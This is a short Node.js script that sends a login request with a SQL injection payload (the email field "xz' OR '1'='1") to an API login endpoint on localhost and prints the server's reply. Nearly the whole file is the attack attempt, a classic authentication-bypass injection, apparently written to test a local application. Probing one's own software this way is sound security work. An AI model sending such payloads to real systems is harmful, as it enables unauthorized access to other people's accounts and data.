const axios = require('axios');

const targetUrl = 'http://localhost:5000/api/user/login';

const payload = {
  email: "xz' OR '1'='1",
  password: "twferguytoukjtrfwedtugtu"
};

axios.post(targetUrl, payload)
  .then(response => {
    console.log('Ответ:', response.data)
  })
  .catch(error => {
    console.error('Error:', error.response ? error.response.data : error.message)
  });
